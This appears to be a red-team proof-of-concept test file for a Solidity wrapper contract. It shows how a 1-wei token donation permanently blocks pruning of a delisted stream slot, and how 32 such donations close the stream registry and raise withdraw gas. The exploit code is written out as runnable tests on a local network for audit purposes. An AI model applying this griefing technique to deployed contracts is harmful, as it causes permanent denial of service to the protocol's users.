import { expect } from "chai";
import { ethers } from "./helpers/hardhat.js";
import { time, takeSnapshot, type SnapshotRestorer } from "./helpers/network-helpers.js";
import { deployOpenIndex, maxIn } from "./helpers/index-vault.js";

/**
 * RED TEAM PoC — PERMANENT STREAM-SLOT PINNING FOR 1 WEI (a spite attack).
 *
 * `pruneStream` is permissionless and is the ONLY way a delisted stream frees
 * its slot. It refuses to prune unless `_probeBalance(token) == 0`.
 *
 * `_probeBalance` reads the LIVE balance. Nothing stops anyone from sending
 * the wrapper 1 wei of that token by raw `transfer` — `depositStream`'s
 * `isStream` gate is irrelevant, a donation needs no function call at all
 * (the contract's own header says so: "a raw `transfer` ... is invisible to
 * this contract").
 *
 * And 1 wei can never leave: `withdraw` pays `mulDiv(wrappedIn, held, denom)`
 * which FLOORS to zero for any held balance smaller than the denominator. So a
 * single wei pins the slot forever.
 *
 * Consequences, none of which need a role and all of which are permanent:
 *   1. The slot is consumed out of MAX_STREAMS = 32, permanently.
 *   2. Every future `withdraw` pays gas to iterate a leg that always pays 0 —
 *      a permanent tax on the one function that must always work.
 *   3. Repeat 32 times and `queueStream` reverts StreamCapReached forever: no
 *      legitimate reward stream can ever be listed again.
 */
describe("RED TEAM — 1 wei permanently pins a stream slot", () => {
  let __snap: SnapshotRestorer;
  before(async () => { __snap = await takeSnapshot(); });
  after(async () => { await __snap.restore(); });

  const E = (n: string) => ethers.parseEther("" + n);
  const DELAY = 48 * 3600;

  async function fixture() {
    const fx = await deployOpenIndex();
    const signers = await ethers.getSigners();
    const lister = signers[9];
    const griefer = signers[10];

    const W = await ethers.getContractFactory("WrappedIndexShare");
    const wrapper: any = await W.deploy(
      fx.vaultAddr,
      "Wrapped Global Index",
      "wIDX",
      fx.roleAdmin.address,
      lister.address,
      DELAY
    );
    const wrapperAddr = await wrapper.getAddress();
    await fx.vault.connect(fx.alice).approve(wrapperAddr, ethers.MaxUint256);
    await fx.tokens[0].connect(fx.alice).approve(wrapperAddr, ethers.MaxUint256);
    return { ...fx, wrapper, wrapperAddr, lister, griefer };
  }

  it("PoC-E: a delisted, fully-drained stream can never be pruned again", async () => {
    const fx = await fixture();
    await fx.vault.connect(fx.alice).mintProRata(E(3000), maxIn(3));
    await fx.wrapper.connect(fx.alice).deposit(E(3000));

    const T = await ethers.getContractFactory("MockIndexToken");
    const tok: any = await T.deploy("OLD", "OLD");
    const addr = await tok.getAddress();

    await fx.wrapper.connect(fx.lister).queueStream(addr);
    await time.increase(DELAY + 1);
    await fx.wrapper.executeStream(addr);
    await fx.wrapper.connect(fx.lister).delistStream(addr);

    expect(await fx.wrapper.streamCount()).to.equal(1n);

    // The griefer donates ONE WEI. No approval, no function on the wrapper,
    // no permission, no relationship to the protocol at all.
    await tok.mint(fx.griefer.address, 1n);
    await tok.connect(fx.griefer).transfer(fx.wrapperAddr, 1n);
    console.log("\n  griefer cost: 1 wei of a worthless token + one transfer's gas");

    await expect(fx.wrapper.pruneStream(addr)).to.be.revertedWithCustomError(
      fx.wrapper,
      "StreamNotEmpty"
    );
    console.log("  pruneStream: REVERTED (StreamNotEmpty)");

    // And the wei is unremovable: every pro-rata payout floors it to zero.
    await fx.wrapper.connect(fx.alice).withdraw(
      (await fx.wrapper.balanceOf(fx.alice.address)) / 2n
    );
    expect(await fx.wrapper.streamHeld(addr)).to.equal(1n);
    await expect(fx.wrapper.pruneStream(addr)).to.be.revertedWithCustomError(
      fx.wrapper,
      "StreamNotEmpty"
    );
    console.log("  after a real withdraw, held is still 1 wei -> slot pinned FOREVER");
    expect(await fx.wrapper.streamCount()).to.equal(1n);
  });

  it("PoC-F: 32 pinned slots permanently close the stream registry", async () => {
    const fx = await fixture();
    await fx.vault.connect(fx.alice).mintProRata(E(3000), maxIn(3));
    await fx.wrapper.connect(fx.alice).deposit(E(3000));

    const T = await ethers.getContractFactory("MockIndexToken");
    for (let i = 0; i < 32; i++) {
      const tok: any = await T.deploy("S" + i, "S" + i);
      const a = await tok.getAddress();
      await fx.wrapper.connect(fx.lister).queueStream(a);
      await time.increase(DELAY + 1);
      await fx.wrapper.executeStream(a);
      await fx.wrapper.connect(fx.lister).delistStream(a);
      // griefer pins it
      await tok.mint(fx.griefer.address, 1n);
      await tok.connect(fx.griefer).transfer(fx.wrapperAddr, 1n);
    }
    expect(await fx.wrapper.streamCount()).to.equal(32n);

    const Fresh: any = await T.deploy("REAL", "REAL");
    await expect(
      fx.wrapper.connect(fx.lister).queueStream(await Fresh.getAddress())
    ).to.be.revertedWithCustomError(fx.wrapper, "StreamCapReached");
    console.log(
      "\n  32 slots pinned for 32 wei total; a legitimate new stream can NEVER be listed"
    );

    // And every exit now pays gas for 34 legs that mostly pay nothing.
    const tx = await fx.wrapper
      .connect(fx.alice)
      .withdraw((await fx.wrapper.balanceOf(fx.alice.address)) / 2n);
    const rc = await tx.wait();
    console.log("  gas for one withdraw across 32 dead legs:", rc!.gasUsed.toString());
  });
});
